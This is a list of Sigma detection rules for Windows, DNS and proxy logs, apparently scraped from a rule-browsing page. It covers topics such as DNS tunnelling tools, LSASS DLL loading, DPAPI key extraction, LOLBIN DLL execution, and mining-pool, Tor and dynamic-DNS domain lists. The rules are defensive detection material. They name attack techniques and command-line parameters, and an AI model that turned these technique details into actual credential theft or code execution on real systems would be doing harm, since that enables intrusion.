<li><a href="#">title:DIT Snapshot Viewer Use id: d3b70aad-097e-409c-9df2-450f80dc476b status: test description: Detects the use of Ditsnap tool. Seems to be a tool for ransomware groups. author: 'Furkan Caliskan (@caliskanfurkan_)' references: - - date: 2020/07/04 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\ditsnap.exe' selection2: CommandLine|contains: 'ditsnap.exe' condition: selection or selection2 falsepositives: - Legitimate admin usage level: high tags: - attack.credential_access - attack.t1003.003 
<li><a href="#">title:Django Framework Exceptions id: fd435618-981e-4a7c-81f8-f78ce480d616 status: stable description: Detects suspicious Django web application framework exceptions that could indicate exploitation attempts author: Thomas Patzke date: 2017/08/05 modified: 2020/09/01 references: - - logsource: category: application product: django detection: keywords: - SuspiciousOperation # Subclasses of SuspiciousOperation - DisallowedHost - DisallowedModelAdminLookup - DisallowedModelAdminToField - DisallowedRedirect - InvalidSessionKey - RequestDataTooBig - SuspiciousFileOperation - SuspiciousMultipartForm - SuspiciousSession - TooManyFieldsSent # Further security-related exceptions - PermissionDenied condition: keywords falsepositives: - Application bugs level: medium tags: - attack.initial_access - attack.t1190 
<li><a href="#">title:DLL Execution via Rasautou.exe id: cd3d1298-eb3b-476c-ac67-12847de55813 status: test description: Detects using Rasautou.exe for loading arbitrary .DLL specified in -d option and executes the export specified in -p. author: Julia Fomina, oscd.community references: - - - date: 2020/10/09 logsource: product: windows category: process_creation definition: Since options '-d' and '-p' were removed in Windows 10 this rule is relevant only for Windows before 10. And as Windows 7 doesn't log command line in 4688 by default, to detect this attack you need Sysmon 1 configured or KB3004375 installed for command-line auditing () detection: selection_img: - Image|endswith: '\rasautou.exe' - OriginalFileName: 'rasdlui.exe' selection_cli: CommandLine|contains|all: - ' -d ' - ' -p ' condition: all of selection* falsepositives: - Unlikely level: medium tags: - attack.defense_evasion - attack.t1218 
<li><a href="#">title:DLL Execution Via Register-cimprovider.exe id: a2910908-e86f-4687-aeba-76a5f996e652 status: test description: Detects using register-cimprovider.exe to execute arbitrary dll file. author: Ivan Dyachkov, Yulia Fomina, oscd.community references: - - date: 2020/10/07 modified: 2021/11/27 logsource: category: process_creation product: windows definition: 'Requirements: Sysmon ProcessCreation logging must be activated and Windows audit msut Include command line in process creation events' detection: selection: Image|endswith: '\register-cimprovider.exe' CommandLine|contains|all: - '-path' - 'dll' condition: selection fields: - CommandLine falsepositives: - Unknown level: medium tags: - attack.defense_evasion - attack.t1574 
<li><a href="#">title:DLL Injection with Tracker.exe id: 148431ce-4b70-403d-8525-fcc2993f29ea status: test description: This rule detects DLL injection and execution via LOLBAS - Tracker.exe author: 'Avneet Singh @v3t0_, oscd.community' references: - date: 2020/10/18 modified: 2021/11/27 logsource: category: process_creation product: windows detection: process_name: Image|endswith: '\tracker.exe' process_description: Description: 'Tracker' commandline_param1: CommandLine|contains: ' /d ' commandline_param2: CommandLine|contains: ' /c ' condition: (process_name or process_description) and commandline_param1 and commandline_param2 falsepositives: - Unknown level: medium tags: - attack.defense_evasion - attack.t1055.001 
<li><a href="#">title:DLL Load via LSASS id: b3503044-60ce-4bf4-bbcb-e3db98788823 status: test description: Detects a method to load DLL via LSASS process using an undocumented Registry key author: Florian Roth references: - - date: 2019/10/16 modified: 2022/04/21 logsource: category: registry_event product: windows detection: selection: TargetObject|contains: - '\CurrentControlSet\Services\NTDS\DirectoryServiceExtPt' - '\CurrentControlSet\Services\NTDS\LsaDbExtPt' filter_domain_controller: Image: 'C:\Windows\system32\lsass.exe' Details: - '%%systemroot%%\system32\ntdsa.dll' - '%%systemroot%%\system32\lsadb.dll' condition: selection and not 1 of filter_* falsepositives: - Unknown level: high tags: - attack.execution - attack.persistence - attack.t1547.008 
<li><a href="#">title:Dllhost Internet Connection id: cfed2f44-16df-4bf3-833a-79405198b277 status: test description: Detects Dllhost that communicates with public IP addresses author: bartblaze references: - date: 2020/07/13 modified: 2022/04/21 logsource: category: network_connection product: windows detection: selection: Image|endswith: '\dllhost.exe' Initiated: 'true' filter_ipv4: DestinationIp|startswith: - '10.' - '192.168.' - '172.16.' - '172.17.' - '172.18.' - '172.19.' - '172.20.' - '172.21.' - '172.22.' - '172.23.' - '172.24.' - '172.25.' - '172.26.' - '172.27.' - '172.28.' - '172.29.' - '172.30.' - '172.31.' - '169.254.' # link-local address - '127.' # loopback address filter_ipv6: DestinationIp|startswith: - '::1' # IPv6 loopback variant - '0:0:0:0:0:0:0:1' # IPv6 loopback variant - 'fe80:' # link-local address - 'fc' # private address range fc00::/7 - 'fd' # private address range fc00::/7 condition: selection and not 1 of filter* falsepositives: - Communication to other corporate systems that use IP addresses from public address spaces level: medium tags: - attack.defense_evasion - attack.t1218 - attack.execution - attack.t1559.001 
<li><a href="#">title:Dllhost Process With No CommandLine id: e7888eb1-13b0-4616-bd99-4bc0c2b054b9 status: experimental description: Detects a "dllhost" spawning with no commandline arguments which is a very rare thing to happen and could indicate process injection activity or malware mimicking similar system processes references: - - author: Nasreddine Bencherchali date: 2022/06/27 logsource: category: process_creation product: windows detection: selection: CommandLine|endswith: 'dllhost.exe' Image|endswith: '\dllhost.exe' condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - Unlikely level: high tags: - attack.defense_evasion - attack.t1055 
<li><a href="#">title:DNS Events Related To Mining Pools id: bf74135c-18e8-4a72-a926-0e4f47888c19 description: Identifies clients that may be performing DNS lookups associated with common currency mining pools. status: experimental references: - date: 2021/08/19 modified: 2021/08/23 author: Saw Winn Naung, Azure-Sentinel, @neu5ron level: low logsource: service: dns product: zeek tags: - attack.t1569.002 - attack.t1496 detection: selection: query|endswith: - 'monerohash.com' - 'do-dear.com' - 'xmrminerpro.com' - 'secumine.net' - 'xmrpool.com' - 'minexmr.org' - 'hashanywhere.com' - 'xmrget.com' - 'mininglottery.eu' - 'minergate.com' - 'moriaxmr.com' - 'multipooler.com' - 'moneropools.com' - 'xmrpool.eu' - 'coolmining.club' - 'supportxmr.com' - 'minexmr.com' - 'hashvault.pro' - 'xmrpool.net' - 'crypto-pool.fr' - 'xmr.pt' - 'miner.rocks' - 'walpool.com' - 'herominers.com' - 'gntl.co.uk' - 'semipool.com' - 'coinfoundry.org' - 'cryptoknight.cc' - 'fairhash.org' - 'baikalmine.com' - 'tubepool.xyz' - 'fairpool.xyz' - 'asiapool.io' - 'coinpoolit.webhop.me' - 'nanopool.org' - 'moneropool.com' - 'miner.center' - 'prohash.net' - 'poolto.be' - 'cryptoescrow.eu' - 'monerominers.net' - 'cryptonotepool.org' - 'extrmepool.org' - 'webcoin.me' - 'kippo.eu' - 'hashinvest.ws' - 'monero.farm' - 'linux-repository-updates.com' - '1gh.com' - 'dwarfpool.com' - 'hash-to-coins.com' - 'pool-proxy.com' - 'hashfor.cash' - 'fairpool.cloud' - 'litecoinpool.org' - 'mineshaft.ml' - 'abcxyz.stream' - 'moneropool.ru' - 'cryptonotepool.org.uk' - 'extremepool.org' - 'extremehash.com' - 'hashinvest.net' - 'unipool.pro' - 'crypto-pools.org' - 'monero.net' - 'backup-pool.com' - 'mooo.com' # Dynamic DNS, may want to exclude - 'freeyy.me' - 'cryptonight.net' - 'shscrypto.net' exclude_answers: answers: - '127.0.0.1' - '0.0.0.0' exclude_rejected: rejected: 'true' condition: selection and not (exclude_answers or exclude_rejected) falsepositives: - A DNS lookup does not necessarily mean a successful attempt, verify a) if there was a response using the zeek answers field, if there was then verify the connections (conn.log) to those IPs. b) verify if HTTP, SSL, or TLS activity to the domain that was queried. http.log field is 'host' and ssl/tls is 'server_name'. fields: - id.orig_h - id.resp_h - query - answers - qtype_name - rcode_name 
<li><a href="#">title:DNS Exfiltration and Tunneling Tools Execution id: 98a96a5a-64a0-4c42-92c5-489da3866cb0 status: test description: Well-known DNS Exfiltration tools execution author: Daniil Yugoslavskiy, oscd.community date: 2019/10/24 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: - Image|endswith: '\iodine.exe' - Image|contains: '\dnscat2' condition: selection falsepositives: - Legitimate usage of iodine or dnscat2 â€” DNS Exfiltration tools (unlikely) level: high tags: - attack.exfiltration - attack.t1048.001 - attack.command_and_control - attack.t1071.004 - attack.t1132.001 
<li><a href="#">title:DNS HybridConnectionManager Service Bus id: 7bd3902d-8b8b-4dd4-838a-c6862d40150d description: Detects Azure Hybrid Connection Manager services querying the Azure service bus service status: experimental date: 2021/04/12 modified: 2021/06/10 author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) tags: - attack.persistence - attack.t1554 references: - logsource: product: windows category: dns_query detection: selection: QueryName|contains: servicebus.windows.net Image|contains: HybridConnectionManager condition: selection falsepositives: - Legitimate use of Azure Hybrid Connection Manager and the Azure Service Bus service level: high 
<li><a href="#">title:DNS Query for MEGA.io Upload Domain id: 613c03ba-0779-4a53-8a1f-47f914a4ded3 description: Detects DNS queries for subdomains used for upload to MEGA.io status: experimental date: 2021/05/26 author: Aaron Greetham (@beardofbinary) - NCC Group references: - tags: - attack.exfiltration - attack.t1567.002 falsepositives: - Legitimate Mega upload level: high logsource: product: windows category: dns_query detection: selection: QueryName|contains: userstorage.mega.co.nz condition: selection 
<li><a href="#">title:DNS Query for Ufile.io Upload Domain id: 1cbbeaaf-3c8c-4e4c-9d72-49485b6a176b description: Detects DNS queries for subdomains used for upload to ufile.io status: experimental date: 2022/06/23 author: yatinwad and TheDFIRReport references: - logsource: product: windows category: dns_query detection: selection: QueryName|contains: ufile.io condition: selection tags: - attack.exfiltration - attack.t1567.002 falsepositives: - Legitimate Ufile upload level: high 
<li><a href="#">title:DNS Query to External Service Interaction Domains id: aff715fa-4dd5-497a-8db3-910bea555566 status: experimental description: Detects suspicious DNS queries to external service interaction domains often used for out-of-band interactions after successful RCE author: Florian Roth, Matt Kelly (list of domains) date: 2022/06/07 references: - logsource: category: dns detection: selection: query|contains: - '.interact.sh' - '.oast.pro' - '.oast.live' - '.oast.site' - '.oast.online' - '.oast.fun' - '.oast.me' - '.burpcollaborator.net' - '.oastify.com' - '.canarytokens.com' - '.requestbin.net' - '.dnslog.cn' condition: selection falsepositives: - Unknown tags: - attack.initial_access - attack.t1190 - attack.reconnaissance - attack.t1595.002 level: high 
<li><a href="#">title:DNS RCE CVE-2020-1350 id: b5281f31-f9cc-4d0d-95d0-45b91c45b487 status: test description: Detects exploitation of DNS RCE bug reported in CVE-2020-1350 by the detection of suspicious sub process author: Florian Roth references: - - date: 2020/07/15 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: '\System32\dns.exe' filter: Image|endswith: - '\System32\werfault.exe' - '\System32\conhost.exe' - '\System32\dnscmd.exe' condition: selection and not filter falsepositives: - Unknown but benign sub processes of the Windows DNS service dns.exe level: critical tags: - attack.initial_access - attack.t1190 - attack.execution - attack.t1569.002 
<li><a href="#">title:DNS Server Error Failed Loading the ServerLevelPluginDLL id: cbe51394-cd93-4473-b555-edf0144952d9 status: test description: This rule detects a DNS server error in which a specified plugin DLL (in registry) could not be loaded author: Florian Roth references: - - (v=ws.10).aspx - date: 2017/05/08 modified: 2021/11/27 logsource: product: windows service: dns-server detection: selection: EventID: - 150 - 770 condition: selection falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1574.002 
<li><a href="#">title:DNS ServerLevelPluginDll Install id: e61e8a88-59a9-451c-874e-70fcc9740d67 status: experimental description: Detects the installation of a plugin DLL via ServerLevelPluginDll parameter in Registry, which can be used to execute code in context of the DNS server (restart required) references: - date: 2017/05/08 modified: 2021/09/12 author: Florian Roth tags: - attack.defense_evasion - attack.t1574.002 - attack.t1112 logsource: product: windows category: registry_event detection: selection: TargetObject|endswith: '\services\DNS\Parameters\ServerLevelPluginDll' condition: selection falsepositives: - Unknown level: high fields: - EventID - CommandLine - ParentCommandLine - Image - User - TargetObject 
<li><a href="#">title:DNS ServerLevelPluginDll Install id: f63b56ee-3f79-4b8a-97fb-5c48007e8573 related: - id: e61e8a88-59a9-451c-874e-70fcc9740d67 type: derived status: experimental description: Detects the installation of a plugin DLL via ServerLevelPluginDll parameter in Registry, which can be used to execute code in context of the DNS server (restart required) references: - date: 2017/05/08 modified: 2021/09/12 author: Florian Roth tags: - attack.defense_evasion - attack.t1574.002 - attack.t1112 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\dnscmd.exe' CommandLine|contains|all: - '/config' - '/serverlevelplugindll' condition: selection falsepositives: - Unknown level: high fields: - EventID - CommandLine - ParentCommandLine - Image - User - TargetObject 
<li><a href="#">title:DNS TOR Proxies id: a8322756-015c-42e7-afb1-436e85ed3ff5 description: Identifies IPs performing DNS lookups associated with common Tor proxies. status: experimental references: - date: 2021/08/15 author: Saw Winn Naung , Azure-Sentinel level: medium logsource: service: dns product: zeek tags: - attack.t1048 detection: selection: query: - 'tor2web.org' - 'tor2web.com' - 'torlink.co' - 'onion.to' - 'onion.ink' - 'onion.cab' - 'onion.nu' - 'onion.link' - 'onion.it' - 'onion.city' - 'onion.direct' - 'onion.top' - 'onion.casa' - 'onion.plus' - 'onion.rip' - 'onion.dog' - 'tor2web.fi' - 'tor2web.blutmagie.de' - 'onion.sh' - 'onion.lu' - 'onion.pet' - 't2w.pw' - 'tor2web.ae.org' - 'tor2web.io' - 'tor2web.xyz' - 'onion.lt' - 's1.tor-gateways.de' - 's2.tor-gateways.de' - 's3.tor-gateways.de' - 's4.tor-gateways.de' - 's5.tor-gateways.de' - 'hiddenservice.net' condition: selection fields: - clientip 
<li><a href="#">title:DNS Tunnel Technique from MuddyWater id: 36222790-0d43-4fe8-86e4-674b27809543 status: test description: Detecting DNS tunnel activity for Muddywater actor author: '@caliskanfurkan_' references: - - date: 2020/06/04 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\powershell.exe' ParentImage|endswith: '\excel.exe' CommandLine|contains: 'DataExchange.dll' condition: selection falsepositives: - Unknown level: critical tags: - attack.command_and_control - attack.t1071.004 
<li><a href="#">title:DNS TXT Answer with Possible Execution Strings id: 8ae51330-899c-4641-8125-e39f2e07da72 status: test description: Detects strings used in command execution in DNS TXT Answer author: Markus Neis references: - - date: 2018/08/08 modified: 2021/11/27 logsource: category: dns detection: selection: record_type: 'TXT' answer|contains: - 'IEX' - 'Invoke-Expression' - 'cmd.exe' condition: selection falsepositives: - Unknown level: high tags: - attack.command_and_control - attack.t1071.004 
<li><a href="#">title:Dnscat Execution id: a6d67db4-6220-436d-8afc-f3842fe05d43 description: Dnscat exfiltration tool execution status: experimental author: Daniil Yugoslavskiy, oscd.community date: 2019/10/24 modified: 2021/10/16 tags: - attack.exfiltration - attack.t1048 - attack.execution - attack.t1059.001 logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains: 'Start-Dnscat2' condition: selection falsepositives: - Legitimate usage of PowerShell Dnscat2 â€” DNS Exfiltration tool (unlikely) level: critical 
<li><a href="#">title:DNSCat2 Powershell Implementation Detection Via Process Creation id: b11d75d6-d7c1-11ea-87d0-0242ac130003 status: test description: The PowerShell implementation of DNSCat2 calls nslookup to craft queries. Counting nslookup processes spawned by PowerShell will show hundreds or thousands of instances if PS DNSCat2 is active locally. author: Cian Heasley references: - - - date: 2020/08/08 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: '\powershell.exe' Image|endswith: '\nslookup.exe' CommandLine|endswith: '\nslookup.exe' condition: selection fields: - Image - CommandLine - ParentImage falsepositives: - Other powershell scripts that call nslookup.exe level: high tags: - attack.command_and_control - attack.t1071 - attack.t1071.004 - attack.t1001.003 - attack.t1041 
<li><a href="#">title:DNS-over-HTTPS Enabled by Registry id: 04b45a8a-d11d-49e4-9acc-4a1b524407a5 status: experimental description: Detects when a user enables DNS-over-HTTPS. This can be used to hide internet activity or be used to hide the process of exfiltrating data. With this enabled organization will lose visibility into data such as query type, response and originating IP that are used to determine bad actors. author: Austin Songer references: - - - - date: 2021/07/22 modified: 2022/03/26 logsource: product: windows category: registry_set detection: selection_edge: EventType: SetValue TargetObject|endswith: '\SOFTWARE\Policies\Microsoft\Edge\BuiltInDnsClientEnabled' Details: DWORD (0x00000001) selection_chrome: EventType: SetValue TargetObject|endswith: '\SOFTWARE\Google\Chrome\DnsOverHttpsMode' Details: 'secure' selection_firefox: EventType: SetValue TargetObject|endswith: '\SOFTWARE\Policies\Mozilla\Firefox\DNSOverHTTPS\Enabled' Details: DWORD (0x00000001) condition: 1 of selection_* falsepositives: - Unlikely level: medium tags: - attack.defense_evasion - attack.t1140 - attack.t1112 
<li><a href="#">title:Domain Trust Discovery id: 3bad990e-4848-4a78-9530-b427d854aac0 related: - id: 77815820-246c-47b8-9741-e0def3f57308 type: obsoletes description: Identifies execution of nltest.exe and dsquery.exe for domain trust discovery. This technique is used by attackers to enumerate Active Directory trusts. status: experimental author: E.M. Anhaus (originally from Atomic Blue Detections, Tony Lambert), oscd.community, omkar72 date: 2019/10/24 modified: 2021/07/09 references: - - - - - tags: - attack.discovery - attack.t1482 logsource: category: process_creation product: windows detection: selection_nltest_v1: Image|endswith: '\nltest.exe' CommandLine|contains: - 'domain_trusts' - 'all_trusts' - '/trusted_domains' - '/dclist' selection_dsquery_v1: Image|endswith: '\dsquery.exe' CommandLine|contains: 'trustedDomain' selection_dsquery_v2: Image|endswith: '\dsquery.exe' CommandLine|contains|all: - '-filter' - 'trustedDomain' condition: 1 of selection* falsepositives: - Legitimate use of the utilities by legitimate user for legitimate reason level: medium 
<li><a href="#">title:Domain User Enumeration Network Recon 01 description: Domain user and group enumeration via network reconnaissance. Seen in APT 29 and other common tactics and actors. Detects a set of RPC (remote procedure calls) used to enumerate a domain controller. The rule was created based off the datasets and hackathon from id: 66a0bdc6-ee04-441a-9125-99d2eb547942 references: - - author: 'Nate Guagenti (@neu5ron), Open Threat Research (OTR)' date: 2020/05/03 modified: 2021/11/14 tags: - attack.discovery - attack.t1087.002 - attack.t1082 logsource: product: zeek service: dce_rpc detection: selection: operation: #- LsarEnumerateTrustedDomains #potentially too many FPs, removing. caused by netlogon #- SamrEnumerateDomainsInSamServer #potentially too many FPs, removing. #method obtains a listing of all domains hosted by the server side of this protocol. This value is a cookie that the server can use to continue an enumeration on a subsequent call - LsarLookupNames3 #method translates a batch of security principal names to their SID form - LsarLookupSids3 #translates a batch of security principal SIDs to their name forms - SamrGetGroupsForUser #obtains a listing of groups that a user is a member of - SamrLookupIdsInDomain #method translates a set of RIDs into account names - SamrLookupNamesInDomain #method translates a set of account names into a set of RIDs - SamrQuerySecurityObject #method queries the access control on a server, domain, user, group, or alias object - SamrQueryInformationGroup #obtains attributes from a group object timeframe: 30s condition: selection falsepositives: - Devices that may do authentication like a VPN or a firewall that looksup IPs to username - False positives depend on scripts and administrative tools used in the monitored environment level: medium status: experimental 
<li><a href="#">title:Domestic Kitten FurBall Malware Pattern id: 6c939dfa-c710-4e12-a4dd-47e1f10e68e1 status: experimental description: Detects specific malware patterns used by FurBall malware linked to Iranian Domestic Kitten APT group author: Florian Roth references: - date: 2021/02/08 tags: - attack.command_and_control logsource: category: proxy detection: selection: c-uri|contains: - 'Get~~~AllBrowser' - 'Get~~~HardwareInfo' - 'Take~~RecordCall' - 'Reset~~~AllCommand' condition: selection fields: - c-ip - c-uri falsepositives: - Unlikely level: high 
<li><a href="#">title:dotNET DLL Loaded Via Office Applications id: ff0f2b05-09db-4095-b96d-1b75ca24894a status: test description: Detects any assembly DLL being loaded by an Office Product author: Antonlovesdnb references: - date: 2020/02/19 modified: 2021/11/27 logsource: category: image_load product: windows detection: selection: Image|endswith: - '\winword.exe' - '\powerpnt.exe' - '\excel.exe' - '\outlook.exe' ImageLoaded|startswith: 'C:\Windows\assembly\' condition: selection falsepositives: - Alerts on legitimate macro usage as well, will need to filter as appropriate level: high tags: - attack.execution - attack.t1204.002 
<li><a href="#">title:Dotnet.exe Exec Dll and Execute Unsigned Code LOLBIN id: d80d5c81-04ba-45b4-84e4-92eba40e0ad3 status: test description: dotnet.exe will execute any DLL and execute unsigned code author: Beyu Denis, oscd.community references: - - - date: 2020/10/18 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine|endswith: - '.dll' - '.csproj' Image|endswith: '\dotnet.exe' condition: selection fields: - ComputerName - User - CommandLine - ParentCommandLine falsepositives: - System administrator Usage level: medium tags: - attack.execution - attack.t1218 
<li><a href="#">title:Download a File with IMEWDBLD.exe id: 8d7e392e-9b28-49e1-831d-5949c6281228 status: experimental description: Use IMEWDBLD.exe (built-in to windows) to download a file author: frack113 references: - - date: 2022/01/22 logsource: category: network_connection product: windows detection: selection: Initiated: 'true' Image|endswith: '\IMEWDBLD.exe' condition: selection falsepositives: - Legitimate script level: high tags: - attack.command_and_control - attack.t1105 
<li><a href="#">title:Download EXE from Suspicious TLD id: b5de2919-b74a-4805-91a7-5049accbaefe status: test description: Detects executable downloads from suspicious remote systems author: Florian Roth date: 2017/03/13 modified: 2021/11/27 logsource: category: proxy detection: selection: c-uri-extension: - 'exe' - 'vbs' - 'bat' - 'rar' - 'ps1' - 'doc' - 'docm' - 'xls' - 'xlsm' - 'pptm' - 'rtf' - 'hta' - 'dll' - 'ws' - 'wsf' - 'sct' - 'zip' # If you want to add more extensions - see filter: r-dns|endswith: - '.com' - '.org' - '.net' - '.edu' - '.gov' - '.uk' - '.ca' - '.de' - '.jp' - '.fr' - '.au' - '.us' - '.ch' - '.it' - '.nl' - '.se' - '.no' - '.es' # Extend this list as needed condition: selection and not filter fields: - ClientIP - c-uri falsepositives: - All kind of software downloads level: low tags: - attack.initial_access - attack.t1566 - attack.execution - attack.t1203 - attack.t1204.002 
<li><a href="#">title:Download Files Using Notepad++ GUP Utility id: 44143844-0631-49ab-97a0-96387d6b2d7c status: experimental description: Detects execution of the Notepad++ updater (gup) from a process other than Notepad++ to download files. author: Nasreddine Bencherchali references: - date: 2022/06/10 logsource: category: process_creation product: windows detection: selection_img: - Image|endswith: '\GUP.exe' - OriginalFileName: 'gup.exe' selection_cli: CommandLine|contains|all: - ' -unzipTo ' - 'http' filter: ParentImage|endswith: '\notepad++.exe' condition: all of selection* and not filter falsepositives: - Other parent processes other than notepad++ using GUP that are not currently identified level: high tags: - attack.command_and_control - attack.t1105 
<li><a href="#">title:Download from Suspicious Dyndns Hosts id: 195c1119-ef07-4909-bb12-e66f5e07bf3c status: test description: Detects download of certain file types from hosts with dynamic DNS names (selected list) author: Florian Roth references: - date: 2017/11/08 modified: 2021/11/27 logsource: category: proxy detection: selection: c-uri-extension: - 'exe' - 'vbs' - 'bat' - 'rar' - 'ps1' - 'doc' - 'docm' - 'xls' - 'xlsm' - 'pptm' - 'rtf' - 'hta' - 'dll' - 'ws' - 'wsf' - 'sct' - 'zip' # If you want to add more extensions - see r-dns|endswith: - '.hopto.org' - '.no-ip.org' - '.no-ip.info' - '.no-ip.biz' - '.no-ip.com' - '.noip.com' - '.ddns.name' - '.myftp.org' - '.myftp.biz' - '.serveblog.net' - '.servebeer.com' - '.servemp3.com' - '.serveftp.com' - '.servequake.com' - '.servehalflife.com' - '.servehttp.com' - '.servegame.com' - '.servepics.com' - '.myvnc.com' - '.ignorelist.com' - '.jkub.com' - '.dlinkddns.com' - '.jumpingcrab.com' - '.ddns.info' - '.mooo.com' - '.dns-dns.com' - '.strangled.net' - '.adultdns.net' - '.craftx.biz' - '.ddns01.com' - '.dns53.biz' - '.dnsapi.info' - '.dnsd.info' - '.dnsdynamic.com' - '.dnsdynamic.net' - '.dnsget.org' - '.fe100.net' - '.flashserv.net' - '.ftp21.net' - '.http01.com' - '.http80.info' - '.https443.com' - '.imap01.com' - '.kadm5.com' - '.mysq1.net' - '.ns360.info' - '.ntdll.net' - '.ole32.com' - '.proxy8080.com' - '.sql01.com' - '.ssh01.com' - '.ssh22.net' - '.tempors.com' - '.tftpd.net' - '.ttl60.com' - '.ttl60.org' - '.user32.com' - '.voip01.com' - '.wow64.net' - '.x64.me' - '.xns01.com' - '.dyndns.org' - '.dyndns.info' - '.dyndns.tv' - '.dyndns-at-home.com' - '.dnsomatic.com' - '.zapto.org' - '.webhop.net' - '.25u.com' - '.slyip.net' condition: selection fields: - cs-ip - c-uri falsepositives: - Software downloads level: medium tags: - attack.defense_evasion - attack.command_and_control - attack.t1105 - attack.t1568 
<li><a href="#">title:Download from Suspicious TLD id: 00d0b5ab-1f55-4120-8e83-487c0a7baf19 status: test description: Detects download of certain file types from hosts in suspicious TLDs author: Florian Roth references: - - - - date: 2017/11/07 modified: 2021/11/27 logsource: category: proxy detection: selection: c-uri-extension: - 'exe' - 'vbs' - 'bat' - 'rar' - 'ps1' - 'doc' - 'docm' - 'xls' - 'xlsm' - 'pptm' - 'rtf' - 'hta' - 'dll' - 'ws' - 'wsf' - 'sct' - 'zip' # If you want to add more extensions - see r-dns|endswith: # Symantec / Chris Larsen analysis - '.country' - '.stream' - '.gdn' - '.mom' - '.xin' - '.kim' - '.men' - '.loan' - '.download' - '.racing' - '.online' - '.science' - '.ren' - '.gb' - '.win' - '.top' - '.review' - '.vip' - '.party' - '.tech' - '.xyz' - '.date' - '.faith' - '.zip' - '.cricket' - '.space' # McAfee report - '.info' - '.vn' - '.cm' - '.am' - '.cc' - '.asia' - '.ws' - '.tk' - '.biz' - '.su' - '.st' - '.ro' - '.ge' - '.ms' - '.pk' - '.nu' - '.me' - '.ph' - '.to' - '.tt' - '.name' - '.tv' - '.kz' - '.tc' - '.mobi' # Spamhaus - '.study' - '.click' - '.link' - '.trade' - '.accountant' # Spamhaus 2018 - '.cf' - '.gq' - '.ml' - '.ga' # Custom - '.pw' condition: selection fields: - ClientIP - c-uri falsepositives: - All kinds of software downloads level: low tags: - attack.initial_access - attack.t1566 - attack.execution - attack.t1203 - attack.t1204.002 
<li><a href="#">title:Download with BITS to Suspicious Folder id: f8a56cb7-a363-44ed-a82f-5926bb44cd05 status: experimental description: | Adversaries may abuse BITS jobs to persistently execute or clean up after malicious payloads. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through [Component Object Model]() references: - author: Florian Roth date: 2022/06/28 logsource: product: windows service: bits-client detection: selection: EventID: 16403 LocalName|contains: - 'C:\Users\Public\' - '%public%' - '\Desktop\' condition: selection falsepositives: - Administrator PowerShell scripts level: high tags: - attack.defense_evasion - attack.persistence - attack.t1197 
<li><a href="#">title:DPAPI Domain Backup Key Extraction id: 4ac1f50b-3bd0-4968-902d-868b4647937e status: test description: Detects tools extracting LSA secret DPAPI domain backup key from Domain Controllers author: Roberto Rodriguez @Cyb3rWard0g references: - date: 2019/06/20 modified: 2022/02/24 logsource: product: windows service: security detection: selection: EventID: 4662 ObjectType: 'SecretObject' AccessMask: '0x2' ObjectName|contains: 'BCKUPKEY' condition: selection falsepositives: - Unknown level: high tags: - attack.credential_access - attack.t1003.004 
<li><a href="#">title:DPAPI Domain Master Key Backup Attempt id: 39a94fd1-8c9a-4ff6-bf22-c058762f8014 status: test description: Detects anyone attempting a backup for the DPAPI Master Key. This events gets generated at the source and not the Domain Controller. author: Roberto Rodriguez @Cyb3rWard0g references: - date: 2019/08/10 modified: 2021/11/27 logsource: product: windows service: security detection: selection: EventID: 4692 condition: selection fields: - ComputerName - SubjectDomainName - SubjectUserName falsepositives: - Unknown level: high tags: - attack.credential_access - attack.t1003.004 
<li><a href="#">title:Dridex Process Pattern id: e6eb5a96-9e6f-4a18-9cdd-642cfda21c8e status: stable description: Detects typical Dridex process patterns author: Florian Roth, oscd.community references: - date: 2019/01/10 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection1: Image|endswith: '\svchost.exe' CommandLine|contains|all: - 'C:\Users\' - '\Desktop\' selection2: ParentImage|endswith: '\svchost.exe' selection3: Image|endswith: '\whoami.exe' CommandLine|contains: 'all' selection4: Image|endswith: - '\net.exe' - '\net1.exe' CommandLine|contains: 'view' condition: selection1 or selection2 and (selection3 or selection4) falsepositives: - Unlikely level: critical tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1055 - attack.discovery - attack.t1135 - attack.t1033 
<li><a href="#">title:Droppers Exploiting CVE-2017-11882 id: 678eb5f4-8597-4be6-8be7-905e4234b53a status: stable description: Detects exploits that use CVE-2017-11882 to start EQNEDT32.EXE and other sub processes like mshta.exe author: Florian Roth references: - - date: 2017/11/23 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: '\EQNEDT32.EXE' condition: selection fields: - CommandLine falsepositives: - Unknown level: critical tags: - attack.execution - attack.t1203 - attack.t1204.002 - attack.initial_access - attack.t1566.001 
<li><a href="#">title:Dropping Of Password Filter DLL id: b7966f4a-b333-455b-8370-8ca53c229762 description: Detects dropping of dll files in system32 that may be used to retrieve user credentials from LSASS status: experimental author: Sreeman date: 2020/10/29 modified: 2021/06/11 references: - - tags: - attack.credential_access - attack.t1556.002 logsource: category: process_creation product: windows detection: selection_cmdline: CommandLine|contains|all: - 'HKLM\SYSTEM\CurrentControlSet\Control\Lsa' - 'scecli\0*' - 'reg add' condition: selection_cmdline falsepositives: - Unknown level: medium 
<li><a href="#">title:DTRACK Process Creation id: f1531fa4-5b84-4342-8f68-9cf3fdbd83d4 status: stable description: Detects specific process parameters as seen in DTRACK infections author: Florian Roth references: - - - date: 2019/10/30 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: ' echo EEEE > ' condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - Unlikely level: critical tags: - attack.impact - attack.t1490 
